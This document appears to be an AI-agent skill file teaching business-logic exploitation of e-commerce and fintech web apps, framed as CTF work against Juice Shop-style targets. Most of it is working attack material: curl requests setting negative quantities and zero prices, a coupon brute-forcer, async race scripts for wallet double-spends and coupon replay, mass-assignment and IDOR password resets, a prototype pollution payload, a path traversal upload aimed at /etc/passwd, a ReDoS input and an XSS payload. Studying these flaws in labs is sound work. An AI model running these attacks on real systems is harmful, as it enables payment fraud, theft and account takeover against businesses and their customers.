---
name: business-logic
description: "Provides techniques for exploiting business logic vulnerabilities in web applications, including e-commerce flow manipulation, race conditions targeting financial transactions, negative quantity attacks, coupon/discount abuse, currency manipulation, and Software Composition Analysis (SCA) to exploit vulnerable third-party dependencies. Use when the target is an e-commerce, fintech, or multi-step transactional application and you need to: exploit race conditions in wallet/balance/coupon endpoints, manipulate order quantities or prices to negative/zero values, stack or replay discount codes, exploit known CVEs in application dependencies (package.json analysis), or abuse multi-step checkout flows with inconsistent state validation."
license: MIT
compatibility: Requires filesystem-based agent (Hermes compatible)
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

# Procedimiento

Sigue los pasos y referencias del contenido base de esta habilidad.

## Guardrails de seguridad

- Ejecuta comandos de este skill solo en entornos autorizados (CTF/lab/sandbox).
- No reutilices payloads ni comandos contra infraestructura real sin permiso explícito.
- Revisa y adapta rutas, hosts y credenciales placeholders antes de ejecutar.
- Las race conditions pueden tener efectos secundarios en el servidor; confirma antes de enviar rafagas grandes.
- Los ataques SCA usan CVEs publicos; usa solo en entornos autorizados.

## Modo de ejecucion eficiente

1. Triage rapido (90-180s): mapea el flujo completo de la transaccion (carrito -> checkout -> pago -> confirmacion).
2. Primitiva minima primero: identifica el campo o paso mas debil antes de encadenar el ataque completo.
3. Bucle corto de iteracion: prueba un vector (cantidad negativa, cupon, race) -> mide respuesta -> ajusta.
4. Pivot temprano: si no hay logica explotable en el flujo de compra, revisa dependencias (SCA).
5. Evidencia y salida: conserva request/response reproducibles para cada vulnerabilidad encontrada.

### Checklist operativo
- Mapea todos los endpoints del flujo transaccional (add-to-cart, checkout, apply-coupon, payment).
- Identifica campos numericos (quantity, price, discount) como candidatos de manipulacion.
- Busca operaciones no atomicas (check-then-act sin transaccion DB).
- Extrae package.json / package-lock.json para analisis SCA.
- Documenta inmediatamente el hallazgo y el siguiente paso.

## Modo de ejecucion eficiente por categoria

- Objetivo inicial: confirmar que un campo numerico o temporal es manipulable con una sola request.
- Orden recomendado: mapeo de flujo -> manipulacion de parametros -> race condition -> SCA.
- Tiempo maximo por hipotesis: 10-15 minutos; si no hay respuesta anomala, pivota.
- Salida minima util: request reproducible con precio/balance/descuento manipulado y evidencia de exito.

## Contenido base

# CTF Web - Business Logic & E-Commerce Exploitation

## Table of Contents
- [Business Logic Attack Methodology](#business-logic-attack-methodology)
- [Negative Quantity / Price Manipulation](#negative-quantity--price-manipulation)
- [Coupon and Discount Abuse](#coupon-and-discount-abuse)
- [Race Conditions in Financial Flows](#race-conditions-in-financial-flows)
  - [Concurrent Coupon Redemption](#concurrent-coupon-redemption)
  - [Wallet Balance Double-Spend](#wallet-balance-double-spend)
  - [Concurrent Registration / Account Takeover](#concurrent-registration--account-takeover)
- [Currency and Payment Manipulation](#currency-and-payment-manipulation)
- [Mass Assignment in Order APIs](#mass-assignment-in-order-apis)
- [Multi-Step Checkout State Inconsistency](#multi-step-checkout-state-inconsistency)
- [Software Composition Analysis (SCA)](#software-composition-analysis-sca)
  - [Extracting package.json](#extracting-packagejson)
  - [CVE Cross-Reference and Triage](#cve-cross-reference-and-triage)
  - [Exploiting Vulnerable Dependencies](#exploiting-vulnerable-dependencies)

---

## Business Logic Attack Methodology

**Threat model for e-commerce CTF applications:**
1. **Data flow mapping** — enumerate all API endpoints involved in a transaction
2. **Parameter mutation** — test numeric fields with negative, zero, float, and overflow values
3. **Sequence abuse** — skip steps, repeat steps, reorder steps in a multi-step flow
4. **Concurrency** — send simultaneous requests to race check-then-act operations
5. **State inconsistency** — modify state between steps (change quantity after price lock)
6. **Dependency CVEs** — cross-reference known-vulnerable libraries with public exploits

```bash
# Full transaction flow mapping (Juice Shop pattern)
# 1. Add item to basket
# 2. Apply coupon
# 3. Set delivery address
# 4. Choose payment method
# 5. Confirm order

# Intercept each step with mitmproxy to identify all API calls
mitmdump -w transaction.mitm "host target"
# Then replay and modify each step
```

---

## Negative Quantity / Price Manipulation

**Pattern:** Applications that accept user-supplied quantity or price without server-side validation allow negative values that reduce totals below zero.

```bash
# Add item with negative quantity — total becomes negative (credit)
curl -s -X POST http://target/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId": 1, "BasketId": 1, "quantity": -100}'

# Modify quantity of existing basket item
curl -s -X PUT http://target/api/BasketItems/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"quantity": -100}'

# Check if total went negative
curl -s http://target/api/Baskets/1 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Price parameter injection:**
```bash
# Try supplying price directly in the order payload
curl -s -X POST http://target/api/Orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"productId": 1, "quantity": 1, "price": 0.01}]}'

# Try overriding totalPrice in checkout payload
curl -s -X POST http://target/api/checkout \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"basketId": 1, "totalPrice": 0}'
```

**Integer overflow / underflow:**
```bash
# Large positive quantity that wraps to negative (int32 overflow: 2147483647 + 1 = -2147483648)
curl -s -X PUT http://target/api/BasketItems/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"quantity": 2147483647}'
```

**Key insight:** The server often validates that quantity > 0 for the add-item endpoint but not for the update-item endpoint. Always test both POST and PUT/PATCH methods separately.

---

## Coupon and Discount Abuse

### Single-Use Coupon Replay
```bash
# Attempt to apply the same coupon multiple times in rapid sequence (race)
# or after clearing the "used" flag via another vulnerability

# Normal coupon application
curl -s -X POST http://target/api/Orders/coupon \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"coupon": "DISCOUNT2024"}'

# Check if coupon usage is validated server-side or just stored in session/JWT
```

### Coupon Code Generation / Brute-Force
```python
# Many CTF coupons follow predictable patterns: MONTH+YEAR, event names
import itertools, string, requests

BASE_URL = "http://target"
TOKEN = "your_jwt_here"

# Pattern: 3-letter month + 2-digit year (e.g., JAN25, FEB25)
months = ['JAN','FEB','MAR','APR','MAY','JUN','JUL','AUG','SEP','OCT','NOV','DEC']
years = ['24', '25', '26']
coupons = [f"{m}{y}" for m in months for y in years]

# Also try: developer names, app name combos
dev_names = ['admin', 'test', 'free', 'demo', 'gift', 'promo']
coupons += [f"{n.upper()}{y}" for n in dev_names for y in years]

for code in coupons:
    r = requests.post(f"{BASE_URL}/api/Orders/coupon",
                      json={"coupon": code},
                      headers={"Authorization": f"Bearer {TOKEN}"})
    if r.status_code == 200:
        print(f"[VALID] {code}: {r.json()}")
```

### Coupon Stacking (Combining Multiple Discounts)
```bash
# Apply coupon A, then B without checking if one is already active
curl -s -X POST http://target/api/apply-coupon \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code": "COUPON_A"}'

# Immediately apply coupon B (before order is processed)
curl -s -X POST http://target/api/apply-coupon \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code": "COUPON_B"}'

# Proceed to checkout — both discounts may stack
curl -s -X POST http://target/api/checkout \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"confirm": true}'
```

---

## Race Conditions in Financial Flows

### Concurrent Coupon Redemption
```python
import asyncio, aiohttp

async def redeem_coupon(session, url, token, code):
    async with session.post(url,
                            json={"coupon": code},
                            headers={"Authorization": f"Bearer {token}"}) as r:
        return r.status, await r.text()

async def race_coupon(target, token, code, n=20):
    url = f"{target}/api/Orders/coupon"
    async with aiohttp.ClientSession() as session:
        tasks = [redeem_coupon(session, url, token, code) for _ in range(n)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for i, r in enumerate(results):
            print(f"[{i}] {r}")

asyncio.run(race_coupon("http://target", "TOKEN", "DISCOUNT50", n=30))
```

### Wallet Balance Double-Spend
```python
import asyncio, aiohttp

async def transfer(session, url, token, amount, recipient):
    async with session.post(url,
                            json={"to": recipient, "amount": amount},
                            headers={"Authorization": f"Bearer {token}"}) as r:
        return r.status, await r.text()

async def double_spend(target, token, amount=100):
    """Send simultaneous transfers — all see pre-transfer balance"""
    url = f"{target}/api/wallet/transfer"
    async with aiohttp.ClientSession() as session:
        # Fire all requests at the same time
        tasks = [transfer(session, url, token, amount, "attacker") for _ in range(50)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        successes = [r for r in results if isinstance(r, tuple) and r[0] == 200]
        print(f"[+] {len(successes)} successful transfers out of 50")

asyncio.run(double_spend("http://target", "TOKEN"))
```

### Concurrent Registration / Account Takeover
```python
import asyncio, aiohttp

async def register(session, url, username, email, password):
    async with session.post(url,
                            json={"username": username, "email": email, "password": password}) as r:
        return r.status, await r.json()

async def race_register(target, n=30):
    """Race for same username — server may assign admin privileges to first"""
    url = f"{target}/api/Users/register"
    async with aiohttp.ClientSession() as session:
        tasks = [register(session, url, "admin", f"admin{i}@test.com", "Password1!") for i in range(n)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, tuple) and r[0] == 201:
                print(f"[+] Registered: {r[1]}")

asyncio.run(race_register("http://target"))
```

```bash
# CLI race with GNU parallel (no Python required)
seq 30 | parallel -j30 curl -s -X POST http://target/api/Orders/coupon \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SINGLE_USE_CODE"}'
```

**Key insight for HTTP/2:** HTTP/2 single-packet race attack — bundle all requests into one TCP packet to minimize timing differences. Use Burp Suite's "Send Group (parallel)" or turbo intruder for precise timing.

---

## Currency and Payment Manipulation

### Currency Code Injection
```bash
# Change currency identifier mid-checkout — server may apply exchange rate incorrectly
curl -s -X POST http://target/api/Orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"currency": "SAT", "amount": 1}'  # Satoshi — tiny denomination

# Try setting amount in one currency, confirming in another
curl -s -X POST http://target/api/payment/init \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"currency": "USD", "amount": 99.99}'

# Then confirm with different currency
curl -s -X POST http://target/api/payment/confirm \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"currency": "JPY", "amount": 99.99}'  # 99.99 JPY ≈ $0.67
```

### Price Override in Payment Payload
```bash
# Intercept and modify the payment confirmation request
# Common fields to manipulate: amount, totalPrice, netPrice, finalAmount
curl -s -X POST http://target/api/payment \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"orderId": 123, "amount": 0.01, "currency": "USD"}'
```

---

## Mass Assignment in Order APIs

**Pattern:** REST APIs expose model fields that should be read-only (price, discountRate, isAdmin, role).

```bash
# Discover available fields by sending extra properties
curl -s -X POST http://target/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "ProductId": 1,
    "BasketId": 1,
    "quantity": 1,
    "price": 0,
    "discount": 100,
    "total": 0
  }'

# Try adding role elevation in user update
curl -s -X PUT http://target/api/Users/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "user@test.com", "role": "admin", "isAdmin": true}'

# IDOR + mass assignment: update another user's profile
curl -s -X PUT http://target/api/Users/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password": "newpassword123"}'
```

---

## Multi-Step Checkout State Inconsistency

**Pattern:** Checkout flows that lock price/discount at step N but re-read basket at step N+1 allow modification between steps.

```bash
# Step 1: Add item, apply discount → price locked
curl -s -X POST http://target/api/BasketItems -H "Authorization: Bearer $TOKEN" \
  -d '{"ProductId": 1, "quantity": 1}'
curl -s -X POST http://target/api/Orders/coupon -H "Authorization: Bearer $TOKEN" \
  -d '{"coupon": "HALF_OFF"}'

# Step 2: (between checkout steps) modify basket quantity to huge number
curl -s -X PUT http://target/api/BasketItems/1 -H "Authorization: Bearer $TOKEN" \
  -d '{"quantity": 9999}'

# Step 3: Complete checkout — may apply discount to new quantity at locked price
curl -s -X POST http://target/api/Orders -H "Authorization: Bearer $TOKEN" \
  -d '{"BasketId": 1}'
```

---

## Software Composition Analysis (SCA)

### Extracting package.json

```bash
# Direct path (most apps serve it)
curl -s http://target/package.json
curl -s http://target/package-lock.json

# Common alternate locations
curl -s http://target/static/package.json
curl -s http://target/.well-known/package.json

# If not directly accessible, look for version disclosure in:
curl -s http://target/api/version
curl -s http://target/api/info
curl -I http://target/ | grep -iE 'X-Powered-By|Server|X-Framework'

# Try error pages — stack traces often show framework versions
curl -s http://target/api/nonexistent
```

### CVE Cross-Reference and Triage

```bash
# Install audit tools
npm install -g npm-audit-report
pip install pip-audit safety

# If you have package.json locally
npm audit --json 2>/dev/null | python3 -c "
import json, sys
data = json.load(sys.stdin)
vulns = data.get('vulnerabilities', {})
for pkg, info in vulns.items():
    if info.get('severity') in ('high', 'critical'):
        print(f'[{info[\"severity\"].upper()}] {pkg}: {info.get(\"via\", [])}')
"

# Manual CVE check with known vulnerable versions
python3 << 'EOF'
import json, urllib.request

# Load extracted package.json
with open("package.json") as f:
    pkgs = json.load(f).get("dependencies", {})

# Check against OSV (Open Source Vulnerabilities)
for pkg, version in pkgs.items():
    version = version.strip("^~>=<")
    url = f"https://api.osv.dev/v1/query"
    payload = json.dumps({"package": {"name": pkg, "ecosystem": "npm"}, "version": version})
    try:
        req = urllib.request.Request(url, data=payload.encode(), headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=5) as r:
            data = json.load(r)
            if data.get("vulns"):
                print(f"[VULN] {pkg}@{version}: {len(data['vulns'])} CVEs")
                for v in data["vulns"][:3]:
                    print(f"  - {v.get('id')}: {v.get('summary','')[:80]}")
    except Exception as e:
        pass
EOF
```

### Exploiting Vulnerable Dependencies

**High-impact dependency categories in Juice Shop / Node.js apps:**

#### Sanitizer bypass (XSS via vulnerable sanitizer)
```bash
# Check sanitizer version
grep -E '"(dompurify|xss|sanitize-html|marked|remarkable)"' package.json

# DOMPurify < 2.4.0 — mXSS bypass
# marked < 4.0.10 — ReDoS
# sanitize-html < 2.7.0 — prototype pollution
# Example payload for old sanitize-html (attribute bypass)
# <img src=1 onerror="alert(1)"> → passes through versions < 2.3.1
```

#### Path traversal via vulnerable parsers
```bash
# multer < 1.4.3 — path traversal in filename
# formidable < 3.2.4 — path traversal
# archiver — zip slip via symlink

# Test: upload file with ../ in filename
curl -s -X POST http://target/api/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.txt;filename=../../etc/passwd"
```

#### Prototype pollution via merge/deep-extend
```bash
# lodash < 4.17.21 — prototype pollution via _.merge
# jquery < 3.4.0 — prototype pollution via $.extend
# deepmerge < 4.2.2 — prototype pollution

# Test payload (sent as JSON body)
curl -s -X POST http://target/api/update-profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"admin": true, "isAdmin": true}}'
```

#### ReDoS (Regular Expression Denial of Service)
```bash
# Express < 4.18.2 — ReDoS in path-to-regexp
# validator < 13.7.0 — ReDoS in various validators

# Test: send crafted input to trigger catastrophic backtracking
# (only test in CTF — causes real DoS)
curl -s -X POST http://target/api/validate-email \
  -d 'email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@b'
```

**Juice Shop specific vulnerable packages to check:**
```bash
# These are known-vulnerable in Juice Shop v12-v14:
# express-jwt < 6.0 — algorithm confusion
# jsonwebtoken < 9.0 — algorithm none bypass
# node-serialize — RCE via deserialization
# marsdb — NoSQL injection
# sequelize < 6.x — SQL injection in certain configurations
# angular < 14 — template injection via ng-bind

grep -E '"(express-jwt|jsonwebtoken|node-serialize|marsdb|sequelize|angular)"' package.json
```

**Key insight:** In Juice Shop, `package.json` is often directly accessible at `/package.json`. Cross-referencing its dependency versions with known CVEs is an official challenge category ("Vulnerable Components"). Combine SCA findings with the specific exploit pattern for each library.
